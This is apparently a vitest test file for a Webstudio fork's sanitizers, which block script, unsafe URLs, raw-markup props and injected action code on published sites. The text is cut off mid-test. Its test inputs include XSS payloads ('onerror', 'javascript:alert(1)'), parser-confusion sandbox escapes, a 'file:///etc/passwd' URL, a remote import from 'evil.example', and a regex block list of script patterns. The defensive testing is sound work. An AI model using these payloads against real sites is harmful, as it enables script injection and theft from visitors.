import { describe, expect, test } from "vitest";
import {
  CheckMarkIcon,
  ChevronDownIcon,
  DotIcon,
  LargeXIcon,
  MenuIcon,
  PlayIcon,
  SpinnerIcon,
} from "@webstudio-is/icons/svg";
import {
  blockComponent,
  blockTemplateComponent,
  collectionComponent,
  descendantComponent,
  elementComponent,
  encodeDataSourceVariable,
  lintExpression,
  ROOT_INSTANCE_ID,
  tags,
  type DataSource,
  type Instance,
  type Page,
  type Pages,
  type Prop,
} from "@webstudio-is/sdk";
import { tagProperty } from "@webstudio-is/sdk/runtime";
import { renderTemplate } from "@webstudio-is/template";
import {
  allowedUrlSchemes,
  anyTagComponents,
  checksInstanceTag,
  checksTagProp,
  elementTagMayRender,
  elementTagMayRun,
  htmlEmbedCodeMayRun,
  orgScriptMayRun,
  pageRedirectMayShip,
  pagesForSitemap,
  pausedPropNames,
  pausedSvgTags,
  projectRedirectMayShip,
  propMayShip,
  propNameMayRun,
  sitemapExcludesPage,
  tagPropNames,
  templateIconCodes,
  urlExpressionMayRun,
  urlMayRun,
  urlValueMayRun,
  withoutBlockedTagProps,
  withoutPausedProps,
  readLiteralValue,
  actionContextOf,
  actionMayRun,
  collidingDataSourceIds,
  componentMayShip,
  instanceIdMayRun,
  isPlainData,
  holdsAngleBrackets,
  holdsComment,
  pageRootIdsOf,
  readsAsOneExpression,
  templateRootIdsOf,
  pagesAndTemplatesOf,
  checkAction,
  type ActionContext,
  type PageNames,
} from "./org-script";
import * as organizeosTemplates from "./templates";

const icons = {
  CheckMarkIcon,
  ChevronDownIcon,
  DotIcon,
  LargeXIcon,
  MenuIcon,
  PlayIcon,
  SpinnerIcon,
};

describe("orgScriptMayRun", () => {
  // T1. Turning the switch on is a reviewed change that edits this test with
  // it (docs/ORGANIZEOS-FORK.md section 10).
  test("is off", () => {
    expect(orgScriptMayRun()).toBe(false);
  });
});

describe("templateIconCodes", () => {
  test("holds the 7 icons upstream's templates put in an HTML Embed", () => {
    expect(templateIconCodes.size).toBeGreaterThanOrEqual(7);
    for (const [name, icon] of Object.entries(icons)) {
      expect(templateIconCodes.has(icon), name).toBe(true);
    }
  });

  // T3. The icons are markup this fork keeps on the live site, so one that
  // could carry script, a link or a foreign document must never join the list.
  test("holds no script, handler, link, reference or animation", () => {
    const forbidden =
      /<script|javascript:|\son[a-z]+\s*=|href|<use|foreignObject|<iframe|<object|<embed|<a[\s>]|<animate|<set[\s/>]/i;
    for (const code of templateIconCodes) {
      expect(code.startsWith("<svg "), code).toBe(true);
      expect(forbidden.test(code), code).toBe(false);
    }
  });
});

describe("htmlEmbedCodeMayRun", () => {
  // T2
  test.each(Object.entries(icons))("keeps %s", (_name, icon) => {
    expect(htmlEmbedCodeMayRun(icon)).toBe(true);
  });

  test("pauses an icon with one character changed", () => {
    expect(htmlEmbedCodeMayRun(MenuIcon.replace("M2.667", "M2.668"))).toBe(
      false
    );
    expect(htmlEmbedCodeMayRun(MenuIcon.slice(0, -1))).toBe(false);
  });

  test("pauses an icon with surrounding whitespace", () => {
    expect(htmlEmbedCodeMayRun(` ${MenuIcon}`)).toBe(false);
    expect(htmlEmbedCodeMayRun(`${MenuIcon}\n`)).toBe(false);
  });

  test("pauses an icon with markup added", () => {
    expect(
      htmlEmbedCodeMayRun(`${MenuIcon}<img src=x onerror="window.x=1">`)
    ).toBe(false);
  });

  test("pauses script", () => {
    expect(htmlEmbedCodeMayRun("<script>window.x=1</script>")).toBe(false);
    expect(htmlEmbedCodeMayRun("")).toBe(false);
  });

  test("pauses a value that is not a string, even one that becomes an icon", () => {
    expect(htmlEmbedCodeMayRun(undefined)).toBe(false);
    expect(htmlEmbedCodeMayRun(null)).toBe(false);
    expect(htmlEmbedCodeMayRun(1)).toBe(false);
    expect(htmlEmbedCodeMayRun({ toString: () => MenuIcon })).toBe(false);
    expect(htmlEmbedCodeMayRun({ code: "<script>window.x=1</script>" })).toBe(
      false
    );
    // String([MenuIcon]) is MenuIcon, which upstream's HTML Embed would write
    // into the page.
    expect(String([MenuIcon])).toBe(MenuIcon);
    expect(htmlEmbedCodeMayRun([MenuIcon])).toBe(false);
    expect(htmlEmbedCodeMayRun(['<img src=x onerror="window.x=1">'])).toBe(
      false
    );
  });

  test("allows anything when the switch is on", () => {
    expect(htmlEmbedCodeMayRun("<script>window.x=1</script>", true)).toBe(true);
    expect(htmlEmbedCodeMayRun(undefined, true)).toBe(true);
    expect(htmlEmbedCodeMayRun([MenuIcon], true)).toBe(true);
  });
});

describe("pausedSvgTags", () => {
  test("are the SMIL elements that can set an attribute to a javascript: URL", () => {
    expect([...pausedSvgTags].sort()).toEqual(["animate", "set"]);
    expect(pausedSvgTags.has("animateTransform")).toBe(false);
    expect(pausedSvgTags.has("animateMotion")).toBe(false);
  });
});

describe("pausedPropNames", () => {
  test("are the props that put markup on a page without an HTML Embed", () => {
    // React writes the value of this prop into the element as raw markup, and
    // nothing in the builder or the generator filters it
    expect([...pausedPropNames]).toEqual(["dangerouslySetInnerHTML"]);
  });
});

describe("propNameMayRun", () => {
  test("is false for a prop that writes raw markup into an element", () => {
    expect(propNameMayRun("dangerouslySetInnerHTML")).toBe(false);
  });

  test("is true for every other name, however much it looks alike", () => {
    for (const name of [
      "id",
      "class",
      "className",
      "href",
      "onClick",
      "innerHTML",
      "dangerouslysetinnerhtml",
      "data-dangerouslySetInnerHTML",
    ]) {
      expect(propNameMayRun(name)).toBe(true);
    }
  });

  test("is true for every name when the switch is on", () => {
    expect(propNameMayRun("dangerouslySetInnerHTML", true)).toBe(true);
  });
});

describe("elementTagMayRun", () => {
  test("is true for every tag the builder offers", () => {
    expect(tags.length).toBeGreaterThan(100);
    for (const tag of tags) {
      expect(elementTagMayRun(tag), tag).toBe(true);
    }
    for (const tag of ["div", "section", "a", "h1", "svg", "iframe"]) {
      expect(elementTagMayRun(tag), tag).toBe(true);
    }
  });

  // React hoists a <script async src> into <head> and runs it, and creates any
  // spelling that is not exactly "script" (SCRIPT) as a live element
  test("is false for script, in every spelling", () => {
    for (const tag of ["script", "SCRIPT", "Script", " script", "script "]) {
      expect(elementTagMayRun(tag), tag).toBe(false);
    }
  });

  test("is false for a tag that is not exactly one the builder offers", () => {
    for (const tag of [
      "DIV",
      "Div",
      "div ",
      "",
      "div />{globalThis.pwned = 1}<div",
      "my-element",
      "constructor",
      "__proto__",
    ]) {
      expect(elementTagMayRun(tag), tag).toBe(false);
    }
  });

  test("is false for a value that is not a string, even one that becomes a tag", () => {
    expect(elementTagMayRun(undefined)).toBe(false);
    expect(elementTagMayRun(null)).toBe(false);
    expect(elementTagMayRun(1)).toBe(false);
    expect(elementTagMayRun({})).toBe(false);
    expect(elementTagMayRun({ toString: () => "div" })).toBe(false);
    expect(elementTagMayRun(["div"])).toBe(false);
    expect(elementTagMayRun(() => "div")).toBe(false);
  });

  test("is true for everything when the switch is on", () => {
    expect(elementTagMayRun("script", true)).toBe(true);
    expect(elementTagMayRun(undefined, true)).toBe(true);
  });
});

describe("elementTagMayRender", () => {
  test("is true for every tag the builder offers but animate and set", () => {
    for (const tag of tags) {
      expect(elementTagMayRender(tag), tag).toBe(
        pausedSvgTags.has(tag) === false
      );
    }
    // they cannot set an arbitrary attribute, and stay
    for (const tag of [
      "animateTransform",
      "animateMotion",
      "mpath",
      "svg",
      "a",
    ]) {
      expect(elementTagMayRender(tag), tag).toBe(true);
    }
  });

  // inside an <a>, SMIL sets the link's href to a javascript: URL that a click
  // runs, past every attribute check
  test("is false for animate and set, and for every tag elementTagMayRun refuses", () => {
    for (const tag of [
      "animate",
      "set",
      "script",
      "SCRIPT",
      "Animate",
      "",
      "div />{globalThis.pwned = 1}<div",
      undefined,
      ["animate"],
    ]) {
      expect(elementTagMayRender(tag), String(tag)).toBe(false);
    }
  });

  test("is true for everything when the switch is on", () => {
    expect(elementTagMayRender("animate", true)).toBe(true);
    expect(elementTagMayRender("script", true)).toBe(true);
  });
});

describe("tagPropNames", () => {
  test("names the runtime's tag property as the framework does, and the legacy tag prop", () => {
    expect(tagProperty).toBe("data-ws-tag");
    expect([...tagPropNames].sort()).toEqual(["data-ws-tag", "tag"]);
    expect(tagPropNames).toContain(tagProperty);
  });
});

describe("anyTagComponents", () => {
  // XML Node writes the tag as the name of an XML element and adds a suffix
  // that no HTML element has, so `urlset`, `loc` and `xhtml:link` are the point
  test("are the components that take any tag name by design", () => {
    expect([...anyTagComponents]).toEqual(["XmlNode"]);
  });
});

describe("checksInstanceTag", () => {
  // Radix's triggers pass their own props, `data-ws-tag` among them (the
  // generator writes `instance.tag` under that name on every component but
  // ws:element), on to the child they render, and Box, Text and Heading make
  // their element from it. So the component that holds the tag does not matter.
  test("is true for every component but XML Node", () => {
    for (const component of [
      elementComponent,
      "Box",
      "Text",
      "Heading",
      "Link",
      "Button",
      "@webstudio-is/sdk-components-react-radix:DialogTitle",
      "@webstudio-is/sdk-components-react-radix:DialogTrigger",
      "@webstudio-is/sdk-components-react-radix:CollapsibleTrigger",
      "Anything",
    ]) {
      expect(checksInstanceTag(component), component).toBe(true);
    }
    expect(checksInstanceTag("XmlNode")).toBe(false);
  });
});

describe("checksTagProp", () => {
  test("is true for a tag prop of every component but ws:element and XML Node", () => {
    for (const component of [
      "Box",
      "Text",
      "Heading",
      "Link",
      "Image",
      "@webstudio-is/sdk-components-react-radix:DialogTitle",
      "@webstudio-is/sdk-components-react-radix:DialogTrigger",
      "@webstudio-is/sdk-components-react-radix:PopoverTrigger",
      "@webstudio-is/sdk-components-react-radix:TooltipTrigger",
      "@webstudio-is/sdk-components-react-radix:CollapsibleTrigger",
      "@webstudio-is/sdk-components-react-radix:NavigationMenuLink",
      "@webstudio-is/sdk-components-react-radix:NavigationMenuTrigger",
      "Anything",
    ]) {
      expect(checksTagProp(component, "tag"), component).toBe(true);
      expect(checksTagProp(component, "data-ws-tag"), component).toBe(true);
    }
  });

  test("is false where the name is only an attribute", () => {
    // ws:element renders instance.tag, and XML Node takes any tag
    for (const component of [elementComponent, "XmlNode"]) {
      expect(checksTagProp(component, "tag"), component).toBe(false);
      expect(checksTagProp(component, "data-ws-tag"), component).toBe(false);
    }
  });

  test("is false for any other name, however much it looks alike", () => {
    for (const name of [
      "src",
      "id",
      "Tag",
      "TAG",
      "data-tag",
      "data-ws-tags",
    ]) {
      expect(checksTagProp("Box", name), name).toBe(false);
    }
  });
});

describe("withoutBlockedTagProps", () => {
  test("drops a tag prop that is not a tag the builder offers, from any component but ws:element and XML Node", () => {
    for (const component of ["Box", "Link", "DialogTrigger"]) {
      expect(
        withoutBlockedTagProps(component, {
          "data-ws-tag": "script",
          tag: "SCRIPT",
          src: "/x.js",
        })
      ).toEqual({ src: "/x.js" });
    }
    for (const component of [elementComponent, "XmlNode"]) {
      const props = { "data-ws-tag": "script", tag: "urlset" };
      expect(withoutBlockedTagProps(component, props)).toBe(props);
    }
  });

  test("drops an animate or set tag prop, which the canvas does not make", () => {
    expect(
      withoutBlockedTagProps("Box", {
        "data-ws-tag": "animate",
        tag: "set",
        attributeName: "href",
      })
    ).toEqual({ attributeName: "href" });
    const kept = { "data-ws-tag": "animateTransform" };
    expect(withoutBlockedTagProps("Box", kept)).toBe(kept);
  });

  test("drops a tag prop that is not a string", () => {
    expect(
      withoutBlockedTagProps("Box", {
        "data-ws-tag": ["div"],
        tag: { toString: () => "div" },
      })
    ).toEqual({});
    expect(withoutBlockedTagProps("Box", { tag: undefined })).toEqual({});
  });

  test("keeps a tag the builder offers, and hands back the same object when nothing goes", () => {
    const props = { "data-ws-tag": "nav", tag: "h3", id: "a" };
    expect(withoutBlockedTagProps("Box", props)).toBe(props);
  });

  test("does not change its input", () => {
    const props = { "data-ws-tag": "script", id: "a" };
    withoutBlockedTagProps("Box", props);
    expect(props).toEqual({ "data-ws-tag": "script", id: "a" });
  });

  test("keeps everything when the switch is on", () => {
    const props = { "data-ws-tag": "script", tag: "script" };
    expect(withoutBlockedTagProps("Box", props, true)).toBe(props);
  });
});

describe("urlMayRun", () => {
  test("allows http, https, mailto, tel and sms, relative and protocol-relative paths, queries, fragments and the empty string", () => {
    expect([...allowedUrlSchemes].sort()).toEqual([
      "http",
      "https",
      "mailto",
      "sms",
      "tel",
    ]);
    for (const url of [
      "http://example.org",
      "https://example.org/a?b=c#d",
      "HTTPS://example.org",
      "mailto:a@example.org",
      "tel:+15555550123",
      "sms:+15555550123",
      "/about",
      "about",
      "./a",
      "../a",
      "//example.org/a",
      "?q=1",
      "#top",
      "",
      "  /a  ",
    ]) {
      expect(urlMayRun(url), url).toBe(true);
    }
  });

  test("refuses javascript: and data: in any case, behind spaces and controls, and split by tabs and newlines", () => {
    for (const url of [
      "javascript:alert(1)",
      "JavaScript:alert(1)",
      " \tjava\nscript:alert(1)",
      "\u0000JavaScript:x",
      "java\r\nscript:x",
      "javascript\t:x",
      "data:text/html,<script>alert(1)</script>",
      "DATA:text/html,x",
      " data:image/png;base64,AAAA",
    ]) {
      expect(urlMayRun(url), JSON.stringify(url)).toBe(false);
    }
  });

  test("refuses every other scheme", () => {
    for (const url of [
      "vbscript:msgbox(1)",
      "blob:https://example.org/1",
      "file:///etc/passwd",
      "about:blank",
      "C:\\x",
      "x-custom+scheme.1:y",
    ]) {
      expect(urlMayRun(url), url).toBe(false);
    }
  });

  test("treats a scheme broken by another character as a relative path", () => {
    // the URL parser stops reading a scheme at the first character that
    // cannot be in one, and reads the whole as a path
    for (const url of [
      "java script:x",
      "java\u0001script:x",
      "1javascript:x",
    ]) {
      expect(urlMayRun(url), JSON.stringify(url)).toBe(true);
    }
  });

  test("allows anything when the switch is on", () => {
    expect(urlMayRun("javascript:alert(1)", true)).toBe(true);
    expect(urlMayRun("data:text/html,x", true)).toBe(true);
  });
});

describe("urlValueMayRun", () => {
  test("reads a value as React writes it", () => {
    // nothing is written
    expect(urlValueMayRun(undefined)).toBe(true);
    expect(urlValueMayRun(null)).toBe(true);
    expect(urlValueMayRun(true)).toBe(true);
    expect(urlValueMayRun(false)).toBe(true);
    expect(urlValueMayRun(() => "javascript:alert(1)")).toBe(true);
    // String(value) is written
    expect(urlValueMayRun("https://example.org")).toBe(true);
    expect(urlValueMayRun(1)).toBe(true);
    expect(urlValueMayRun({ href: "javascript:alert(1)" })).toBe(true);
    expect(urlValueMayRun(["/a", "javascript:alert(1)"])).toBe(true);
    expect(urlValueMayRun("javascript:alert(1)")).toBe(false);
    expect(urlValueMayRun({ toString: () => "javascript:alert(1)" })).toBe(
      false
    );
  });

  test("refuses an array that joins into a javascript: address, and a symbol", () => {
    expect(String(["javascript:alert(1)"])).toBe("javascript:alert(1)");
    expect(urlValueMayRun(["javascript:alert(1)"])).toBe(false);
    expect(urlValueMayRun([["javascript:alert(1)"]])).toBe(false);
    expect(urlValueMayRun(["data:text/html,x"])).toBe(false);
    expect(urlValueMayRun(Symbol("x"))).toBe(false);
    expect(
      urlValueMayRun({
        toString: () => {
          throw new Error("no");
        },
      })
    ).toBe(false);
    expect(urlValueMayRun(["javascript:alert(1)"], true)).toBe(true);
  });
});

describe("urlExpressionMayRun", () => {
  test("judges a JSON literal by its value", () => {
    expect(urlExpressionMayRun('"https://example.org"')).toBe(true);
    expect(urlExpressionMayRun('""')).toBe(true);
    expect(urlExpressionMayRun("null")).toBe(true);
    expect(urlExpressionMayRun("1")).toBe(true);
    expect(urlExpressionMayRun('"javascript:alert(1)"')).toBe(false);
    expect(urlExpressionMayRun('["javascript:alert(1)"]')).toBe(false);
    expect(urlExpressionMayRun('" data:text/html,x"')).toBe(false);
  });

  test("allows a fixed start that decides the scheme", () => {
    for (const expression of [
      "`/events/${x.slug}`",
      '"/events/" + x.slug',
      '"mailto:" + x',
      '"https://" + x',
      '"tel:" + x',
      '"?q=" + x',
      '"#" + x',
      '"a/" + x',
      '("/a" + x)',
      '"/a" + "/b" + x',
      '"/a/" + `${x}`',
      '"https:" + `//${x}`',
      '"/a" + (1 + x)',
    ]) {
      expect(urlExpressionMayRun(expression), expression).toBe(true);
    }
  });

  test("refuses a start that decides nothing", () => {
    for (const expression of [
      "x",
      "x.url",
      '"" + x',
      '" " + x',
      '"java" + x',
      '"java" + `script${x}`',
      "`${x}/a`",
      "1 + x",
      'x + "/a"',
      "f()",
      "x[0]",
    ]) {
      expect(urlExpressionMayRun(expression), expression).toBe(false);
    }
  });

  test("refuses a fixed start with a refused scheme", () => {
    for (const expression of [
      '"javascript:" + x',
      "`data:${x}`",
      '"java" + "script:" + x',
      '" \\tjava\\nscript:" + x',
      '"java" + "script:alert(1)"',
    ]) {
      expect(urlExpressionMayRun(expression), expression).toBe(false);
    }
  });

  test("needs both branches of a conditional or logical expression", () => {
    expect(urlExpressionMayRun('x ? "/a" : "https://example.org"')).toBe(true);
    expect(urlExpressionMayRun('x ? "/a" + y : `#${y}`')).toBe(true);
    expect(urlExpressionMayRun('(x ? "/a" : "/b")')).toBe(true);
    expect(urlExpressionMayRun('x ? "/a" : y')).toBe(false);
    expect(urlExpressionMayRun('x ? "javascript:x" : "/a"')).toBe(false);
    expect(urlExpressionMayRun('x || "/a"')).toBe(false);
    expect(urlExpressionMayRun('"/a" ?? x')).toBe(false);
    expect(urlExpressionMayRun('x.ok && "/a"')).toBe(false);
    expect(urlExpressionMayRun('"/a" || "/b"')).toBe(true);
  });

  test("refuses what is not exactly one expression", () => {
    for (const expression of [
      '"/a", "javascript:x"',
      '"/a"; x',
      '"/a" // x',
      '/* x */ "/a"',
      '"/a" +',
      "",
      "(",
    ]) {
      expect(urlExpressionMayRun(expression), expression).toBe(false);
    }
    // whitespace around one expression is not another
    expect(urlExpressionMayRun(' "/a" + x\n')).toBe(true);
  });

  test("allows anything when the switch is on", () => {
    expect(urlExpressionMayRun('"javascript:" + x', true)).toBe(true);
    expect(urlExpressionMayRun("x", true)).toBe(true);
  });
});

const radixTrigger = "@webstudio-is/sdk-components-react-radix:DialogTrigger";

const staticProp = (
  name: string,
  value: string,
  type: "string" | "expression" = "string"
): Prop => ({ id: name, instanceId: "i", name, type, value });

type ActionProp = Extract<Prop, { type: "action" }>;

const actionProp = (
  value: Array<{ args: string[]; code: string }>,
  name = "onClick"
): ActionProp => ({
  id: name,
  instanceId: "i",
  name,
  type: "action",
  value: value.map((entry) => ({ type: "execute", ...entry })),
});

// The builder's canvas and the published page's generator write an action as
// code: its args as an arrow function's parameters and its code as the body.
// The canvas runs it as soon as it computes prop values, and the site's server
// renders it (docs/ORGANIZEOS-FORK.md section 10).
describe("actionMayRun", () => {
  const variable = encodeDataSourceVariable("var-1");
  const count = encodeDataSourceVariable("count");
  const resource = encodeDataSourceVariable("resource-1");
  const parameter = encodeDataSourceVariable("parameter-1");
  const own = encodeDataSourceVariable("own");
  const sibling = encodeDataSourceVariable("sibling");
  const onePath = encodeDataSourceVariable("one-path");
  const everyPath = encodeDataSourceVariable("every-path");
  const unscoped = encodeDataSourceVariable("unscoped");

  const signupForm = "@organizeos/site-components:SignupForm";

  // A page, its body holding a Signup Form, a Box and a Slot's shared
  // instance reached from two parents
  const node = (
    component: string,
    ...children: string[]
  ): Pick<Instance, "component" | "children"> => ({
    component,
    children: children.map((value) => ({ type: "id", value })),
  });
  const instances = new Map([
    ["body", node("Body", "form", "box", "other", "left", "right")],
    ["form", node(signupForm)],
    ["box", node("Box")],
    ["other", node("Box")],
    ["left", node("Box", "shared")],
    ["right", node("Box", "shared")],
    ["shared", node("Box", "shared-form")],
    ["shared-form", node(signupForm)],
  ]);
  const scoped = (
    type: "variable" | "resource" | "parameter",
    scopeInstanceId: string,
    name = `${type}-${scopeInstanceId}`
  ) => ({ type, scopeInstanceId, name });
  const dataSources: ActionContext["dataSources"] = new Map<
    string,
    {
      type: "variable" | "resource" | "parameter";
      scopeInstanceId?: string;
      name: string;
    }
  >([
    ["var-1", scoped("variable", "body")],
    ["count", scoped("variable", ROOT_INSTANCE_ID)],
    ["resource-1", scoped("resource", "body")],
    ["parameter-1", scoped("parameter", "body")],
    ["own", scoped("variable", "form")],
    ["sibling", scoped("variable", "other")],
    ["one-path", scoped("variable", "left")],
    ["every-path", scoped("variable", "shared")],
    ["", scoped("variable", "body")],
    ["unscoped", { type: "variable" as const, name: "unscoped" }],
  ]);
  const context: ActionContext = {
    instances,
    pageRootIds: new Set(["body"]),
    dataSources,
  };

  // An action on the Signup Form's onStateChange, which passes plain data
  const mayRun = (
    value: Array<{ args: string[]; code: string }>,
    { holder = "form", name = "onStateChange" } = {}
  ) =>
    actionMayRun({ ...actionProp(value, name), instanceId: holder }, context);
  const codeMayRun = (code: string, args: string[] = []) =>
    mayRun([{ args, code }]);

  // The linter as the rule calls it
  const lint = (code: string, args: string[] = []) =>
    lintExpression({
      expression: code,
      availableVariables: new Set([
        ...args,
        variable,
        count,
        resource,
        parameter,
        "undefined",
      ]),
      allowAssignment: true,
    });

  test("refuses an args entry that is not a plain identifier", () => {
    for (const arg of [
      ") => 0, globalThis.pwned = 1, (",
      "a = alert(1)",
      "...a",
      "a, b",
      "",
      // a Cyrillic a, a zero-width space, a line separator, an accented letter
      "а",
      "a​",
      "a ",
      "évent",
      "a\n",
      " a",
      "1a",
    ]) {
      expect(codeMayRun(`${variable} = 1`, [arg]), JSON.stringify(arg)).toBe(
        false
      );
    }
    // in any entry, not only the last
    expect(
      mayRun([
        { args: ["state", "a = alert(1)"], code: `${variable} = state` },
        { args: ["state"], code: `${variable} = state` },
      ])
    ).toBe(false);
  });

  test("refuses an arg that could be a name the canvas or the generator writes", () => {
    for (const arg of ["_getVariable", "_x", "a$", "$", "arguments", "eval"]) {
      expect(codeMayRun(`${variable} = 1`, [arg]), arg).toBe(false);
    }
    for (const arg of ["event", "value", "state", "a_b", "x1"]) {
      expect(codeMayRun(`${variable} = 1`, [arg]), arg).toBe(true);
    }
  });

  test("refuses a code that fails the linter", () => {
    for (const code of [
      "",
      "alert(1)",
      `${variable} = 1, ${variable} = 2`,
      `${variable}++`,
      `[${variable}] = [1]`,
      `${variable} = 1;`,
      `${variable} = import("https://evil.example/x.js")`,
    ]) {
      expect(
        lint(code).some((diagnostic) => diagnostic.severity === "error"),
        code
      ).toBe(true);
      expect(codeMayRun(code), code).toBe(false);
    }
  });

  test("refuses legacy octal syntax", () => {
    for (const code of [`${variable} = 010`, `${variable} = "\\01"`]) {
      expect(
        lint(code).some((diagnostic) => diagnostic.severity === "error"),
        code
      ).toBe(true);
      expect(codeMayRun(code), code).toBe(false);
    }
  });

  test("refuses a code that names anything but its args, a variable or a Resource in scope, and undefined", () => {
    for (const code of ["pwned = 1", `${variable} = document`, "name = 1"]) {
      expect(codeMayRun(code), code).toBe(false);
    }
  });

  test("refuses a code that names an arg the generated function does not take", () => {
    // An action may name only the args its last entry lists
    const earlier = { args: ["location"], code: 'location = "/away"' };
    expect(mayRun([earlier, { args: [], code: `${variable} = 1` }])).toBe(
      false
    );
    expect(
      mayRun([
        { args: ["state"], code: `${variable} = state` },
        { args: ["state"], code: `${variable} = state + "!"` },
      ])
    ).toBe(true);
  });

  // A component may pass a host object to its action (a React event's view is
  // the window), so an action names its args only where the component passes
  // plain data
  test("names its args only on the props through which a component passes plain data", () => {
    const holders = new Map([
      ["webhook", node("Form")],
      ["signup", node(signupForm)],
      ["rsvp", node("@organizeos/site-components:RsvpForm")],
      ["rotation", node("@organizeos/site-components:RotationControl")],
      ["button", node("ws:element")],
    ]);
    const tree: ActionContext = {
      instances: new Map([
        ["body", node("Body", ...holders.keys())],
        ...holders,
      ]),
      pageRootIds: new Set(["body"]),
      dataSources,
    };
    const named = (holder: string, name: string, code: string) =>
      actionMayRun(
        {
          ...actionProp([{ args: ["arg"], code }], name),
          instanceId: holder,
        },
        tree
      );
    for (const [holder, name] of [
      ["webhook", "onStateChange"],
      ["signup", "onStateChange"],
      ["rsvp", "onStateChange"],
      ["rotation", "onValueChange"],
    ]) {
      expect(named(holder, name, `${variable} = arg`), holder).toBe(true);
      // another prop of the same component
      expect(named(holder, "onClick", `${variable} = arg`), holder).toBe(false);
    }
    // the same prop name on another component
    expect(named("button", "onStateChange", `${variable} = arg`)).toBe(false);
    expect(named("button", "onClick", `${variable} = arg`)).toBe(false);
    expect(named("button", "onClick", `${variable} = arg ? 1 : 0`)).toBe(false);
    // there an action lists no args, even ones its code does not name
    expect(named("button", "onClick", `${variable} = 1`)).toBe(false);
    expect(named("button", "onClick", `${variable} = ${count}`)).toBe(false);
    expect(
      actionMayRun(
        {
          ...actionProp(
            [
              { args: ["arg"], code: `${variable} = 1` },
              { args: [], code: `${count} = 1` },
            ],
            "onClick"
          ),
          instanceId: "button",
        },
        tree
      )
    ).toBe(false);
    // and may still set a variable
    const unnamed = (code: string) =>
      actionMayRun(
        {
          ...actionProp([{ args: [], code }], "onClick"),
          instanceId: "button",
        },
        tree
      );
    expect(unnamed(`${variable} = 1`)).toBe(true);
    expect(unnamed(`${variable} = ${count}`)).toBe(true);
    // and a holder the build does not hold names none
    expect(named("missing", "onStateChange", `${variable} = arg`)).toBe(false);
  });

  // While org script is paused an action assigns plain values: its code reads
  // no member and calls nothing
  test("refuses member access and calls, however they are written", () => {
    const args = ["event", "a", "f", "X", "tag", "k"];
    for (const code of [
      'event.view.location.replace("javascript:alert(1)")',
      '"x".replace(/.+/, event.view.eval)',
      `${variable} = event.view.document.cookie`,
      'event.target.innerHTML = "<img src=x onerror=alert(1)>"',
      `${variable} = a.b`,
      `${variable} = a["b"]`,
      `${variable} = f()`,
      `${variable} = new X()`,
      `${variable} = tag\`x\``,
      `${variable} = a?.b`,
      `${variable} = { get x() { return 1 } }`,
      `${variable} = { [k]: 1 }`,
      `${variable} = { f() {} }`,
      `${variable} = () => 1`,
      `${variable} = this`,
      `${variable} = [...a]`,
      `${variable} = { ...a }`,
      `${variable} = delete a`,
    ]) {
      expect(codeMayRun(code, args), code).toBe(false);
    }
  });

  // Each of these is otherwise a plain value
  test("refuses a < or << followed anywhere by a token that starts with >", () => {
    const args = ["a", "b", "c", "d", "state"];
    for (const code of [
      `${variable} = a < b > (c)`,
      `${variable} = a<b>(c)`,
      `${variable} = a < b > /* x */ (c)`,
      `${variable} = a < b > \`x\``,
      `${variable} = a < typeof b > (c)`,
      `${variable} = a < b | c > (d)`,
      `${variable} = a < b < c >> (d)`,
      `${variable} = a < b > /(c)/g`,
      `${variable} = a < b > ["x"]`,
      `${variable} = a < 1 >\n["constructor"]`,
      `${variable} = "s" < 1 >\n ["constructor"] < 1 >\n ["constructor"]`,
      `${variable} = ${variable} < 1 >  ["constructor"] < 1 >  ["constructor"]`,
      `${variable} = ${variable} < 1 >  ["constructor"]`,
      `${variable} = ${variable} < 1 >\r ["constructor"]`,
      `${variable} = ${variable} < 1 > /*\n*/ ["constructor"]`,
      `${variable} = ${variable} < 1 > // x\n ["constructor"]`,
      `${variable} = state < ${count} >\n["constructor"]`,
      `${variable} = 1 < 2 >\n{} / "/}, globalThis.pwned = 1, () => { // "`,
      `${variable} = 1 < 2 >\r{} / "/}, globalThis.pwned = 1, () => { // "`,
      `${variable} = 1 < 2 > {} / "/}, globalThis.pwned = 1, () => { // "`,
      `${variable} = 1 < 2 > /*\n*/ {} / "/}, globalThis.pwned = 1, () => { // "`,
      `${variable} = a < b >= c`,
      `${variable} = a << b >>> c`,
      `${variable} = a < b ? c : d > a`,
      `${variable} = [a < b, c > d]`,
      `${variable} = a < b >> c`,
      `${variable} = \`\${a < b}\` + (c > d)`,
    ]) {
      expect(codeMayRun(code, args), JSON.stringify(code)).toBe(false);
    }
    // a > before any <, a < alone and a > alone pass
    for (const code of [
      `${variable} = a > b && b < c`,
      `${variable} = a < b`,
      `${variable} = a <= b && b >= c`,
      `${variable} = "<" + ">"`,
      `${variable} = \`<\${a}>\``,
    ]) {
      expect(codeMayRun(code, args), code).toBe(true);
    }
  });

  test("refuses an action whose code holds a comment, of either kind, anywhere in it", () => {
    for (const code of [
      `${variable} = /* x */ 1`,
      `${variable} /* x */ = 1`,
      `${variable} = /**/ state`,
      `${variable} = // x\n 1`,
      `${variable} = state ? /* x */ 1 : 2`,
      `${variable} = { a: /* x */ 1 }`,
      `${variable} = 1 <!-- x`,
      `${variable} = 1\n--> x`,
    ]) {
      expect(codeMayRun(code, ["state"]), JSON.stringify(code)).toBe(false);
    }
    // the same characters in a string or a template's text
    for (const code of [
      `${variable} = "/* x */"`,
      `${variable} = "// x"`,
      `${variable} = \`/* x */\``,
      `${variable} = 1 / 2`,
    ]) {
      expect(codeMayRun(code), code).toBe(true);
    }
  });

  test("refuses a regular expression", () => {
    for (const code of [
      `${variable} = /x/`,
      `${variable} = "a" < "b" > /x/`,
      "1 < 2 > /(globalThis.pwned = 1)/g",
    ]) {
      expect(codeMayRun(code), code).toBe(false);
    }
    expect(
      codeMayRun(
        `${variable} = ${variable} < ${count} > /(globalThis.pwned = state.view)/i`,
        ["state"]
      )
    ).toBe(false);
  });

  test("refuses a code that is not exactly one expression, read the same way as a statement", () => {
    for (const code of [
      // a code that starts with an object
      '{} / "/}, globalThis.pwned = 1, () => { // "',
      `${variable} = 1 /* x */`,
    ]) {
      expect(codeMayRun(code), code).toBe(false);
    }
  });

  test("refuses a code that starts with a character that would join it to the line before", () => {
    for (const code of ["[0]", "`x`", "+1", "-1", '("x")', "/x/", "{}"]) {
      expect(
        mayRun([
          { args: [], code: variable },
          { args: [], code },
        ]),
        code
      ).toBe(false);
    }
  });

  // An action may name only a variable or a Resource in scope: the holder's
  // own, an ancestor's on every path from a page root, or a global one
  test("refuses a data source that is not a variable or a Resource in scope", () => {
    for (const code of [
      `${parameter} = "x"`,
      `${variable} = ${parameter}`,
      `${encodeDataSourceVariable("missing")} = 1`,
      `${variable} = $ws$system`,
      // a sibling's, and an ancestor's on one path only
      `${sibling} = 1`,
